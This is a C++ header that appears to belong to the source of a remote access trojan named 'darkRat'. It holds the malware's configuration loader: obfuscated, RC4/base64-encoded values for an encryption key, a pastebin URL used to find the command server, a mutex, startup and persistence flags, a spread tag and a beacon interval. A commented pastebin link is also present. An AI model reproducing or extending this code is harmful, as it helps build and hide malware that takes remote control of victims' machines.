#pragma once
#include "BuildSystem\crypto\base64.h"
#include "BuildSystem\crypto\rc4.h"

std::string key(int seed)
{
	srand(seed);
	int length = 32;
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

namespace darkRat
{
	namespace config
	{
		class config
		{
		public:
			std::string pastebinUrl;
			std::string mutex;
			std::string startup;
			std::string requestInterval;
			std::string persistence;
			std::string spreadtag;
			std::string useragent;
			std::string versionID = OBFUSCATE("2.1.3");
			std::string encryptionKey;
			config(std::string ek, std::string pu, std::string mux, std::string sup, std::string ri, std::string per, std::string st, std::string ua)
			{
				encryptionKey = ek;
				pastebinUrl = pu;
				persistence = per;
				mutex = mux;
				spreadtag = st;
				startup = sup;
				useragent = ua;
				requestInterval = ri;
			}
		};

		config load()
		{
			return config(OBFUSCATE("IQHN6ag+L3gZd0h0fLh679uQ7L4zUlyVM0jY"),
				OBFUSCATE("TBz9HRxjyj7YTMH/v/peLG0A4g4xsdvCvg=="), //Debug //http://pastebin.com/raw/wJJPteV2
				OBFUSCATE("8jCPd9d"),
				OBFUSCATE("false"),
				OBFUSCATE("600"),
				OBFUSCATE("false"),
				OBFUSCATE("main"),
				OBFUSCATE("test")
			);
			
		}
	}
}

